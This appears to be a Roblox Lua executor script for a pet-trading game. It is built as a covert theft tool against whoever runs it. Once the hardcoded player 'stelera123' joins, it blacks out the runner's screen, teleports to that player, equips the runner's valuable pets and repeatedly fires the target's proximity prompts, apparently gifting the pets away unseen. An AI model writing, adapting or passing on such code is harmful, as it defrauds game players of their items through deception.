local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer
local TargetPlayerName = "stelera123"
local activePrompts = {} -- track prompts being held
local blackScreenShown = false

-- Allowed pet types (case-insensitive)
local ALLOWED_PET_TYPES = { 
    "dog", "bunny", "mimic octopus", "disco bee", "raccoon", "kitsune",
    "butterfly", "spinosaurus", "dragonfly", "queen bee", "night owl",
    "t-rex", "french fry ferret", "blood owl", "chicken zombie",
    "hyacinth macaw", "dilophosaurus", "spaghetti sloth"
}

local allowedTypesLower = {}
for _, name in ipairs(ALLOWED_PET_TYPES) do
    allowedTypesLower[name:lower()] = true
end

local function createBlackScreen()
    local player = LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")
    if playerGui:FindFirstChild("BlackScreenGUI") then return end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BlackScreenGUI"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(2, 0, 3, 0)
    frame.Position = UDim2.new(-0.5, 0, -1, -300)
    frame.BackgroundColor3 = Color3.new(0, 0, 0)
    frame.BorderSizePixel = 0
    frame.ZIndex = math.huge
    frame.Parent = screenGui
end

local function waitForCharacter()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hrp = char:WaitForChild("HumanoidRootPart")
    return char, hrp
end

local function teleportToTarget()
    local target = Players:FindFirstChild(TargetPlayerName)
    local char = LocalPlayer.Character
    if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and char and char:FindFirstChild("HumanoidRootPart") then
        char.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame
        return true
    end
    return false
end

local function equipAllowedPetTools()
    local target = Players:FindFirstChild(TargetPlayerName)
    if not target or not target.Character then return end
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    local char = LocalPlayer.Character
    if backpack and char then
        for _, tool in pairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local toolName = tool.Name:lower()
                for allowedName in pairs(allowedTypesLower) do
                    if toolName:find(allowedName) then
                        tool.Parent = char
                        task.wait(0.05)
                        break
                    end
                end
            end
        end
    end
end

local function getVisiblePrompts(hrp)
    local visiblePrompts = {}
    for _, prompt in pairs(workspace:GetDescendants()) do
        if prompt:IsA("ProximityPrompt") and prompt.Parent:IsA("BasePart") then
            local distance = (prompt.Parent.Position - hrp.Position).Magnitude
            if distance <= prompt.MaxActivationDistance and prompt.ObjectText == TargetPlayerName then
                table.insert(visiblePrompts, {prompt = prompt, distance = distance})
            end
        end
    end
    return visiblePrompts
end

local function activatePrompt(prompt, distance)
    if activePrompts[prompt] then return end
    activePrompts[prompt] = true
    fireproximityprompt(prompt, distance or 0)
    task.spawn(function()
        task.wait(prompt.HoldDuration or 1)
        activePrompts[prompt] = nil
    end)
end

-- Main
local char, hrp = waitForCharacter()

-- Wait until target player joins
repeat
    task.wait(1)
until Players:FindFirstChild(TargetPlayerName)

-- Target joined — wait 5 seconds before starting
task.wait(5)

-- Show black screen once
if not blackScreenShown then
    blackScreenShown = true
    task.spawn(createBlackScreen)
end

-- Continuous loop
while true do
    local target = Players:FindFirstChild(TargetPlayerName)
    if target then
        teleportToTarget()
        equipAllowedPetTools()
        local prompts = getVisiblePrompts(hrp)
        for _, data in pairs(prompts) do
            activatePrompt(data.prompt, data.distance)
        end
    end
    task.wait(0.1)
end
